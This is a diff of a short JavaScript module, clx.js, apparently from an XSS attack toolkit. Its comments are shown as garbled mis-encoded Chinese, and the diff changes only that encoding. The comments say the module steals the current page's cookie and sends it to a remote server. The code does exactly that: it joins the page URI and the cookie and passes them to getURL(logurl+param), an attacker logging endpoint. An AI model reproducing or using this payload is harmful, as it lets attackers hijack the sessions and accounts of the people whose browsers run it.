@@ -1,14 +1,14 @@
 /////////////////////////////////////////////////
-// clx.js ³şÁôÏãÄ£¿é£¬µÁÈ¡µ±Ç°Ò³Ãæcookie
-// ²¢·¢ËÍµ½Ô¶³Ìserver
-//alert("clx.js ³şÁôÏãÄ£¿é");
+// clx.js æ¥šç•™é¦™æ¨¡å—ï¼Œç›—å–å½“å‰é¡µé¢cookie
+// å¹¶å‘é€åˆ°è¿œç¨‹server
+//alert("clx.js æ¥šç•™é¦™æ¨¡å—");
 /////////////////////////////////////////////////
 
 ////////////////////////////////////////////////////////////
-// ¿ªÊ¼Ö´ĞĞ¹¦ÄÜ
+// å¼€å§‹æ‰§è¡ŒåŠŸèƒ½
 ////////////////////////////////////////////////////////////
-var param = XssGotURI+XssGotCookie;  // ´«µİ»ØserverµÄ²ÎÊı
-//param = base64encode(param); // base64 ¼ÓÃÜ²ÎÊı´«Êä
+var param = XssGotURI+XssGotCookie;  // ä¼ é€’å›serverçš„å‚æ•°
+//param = base64encode(param); // base64 åŠ å¯†å‚æ•°ä¼ è¾“
 //alert(param);
-// ·¢ËÍcookie ºÍ uri »Ø server
+// å‘é€cookie å’Œ uri å› server
 getURL(logurl+param);
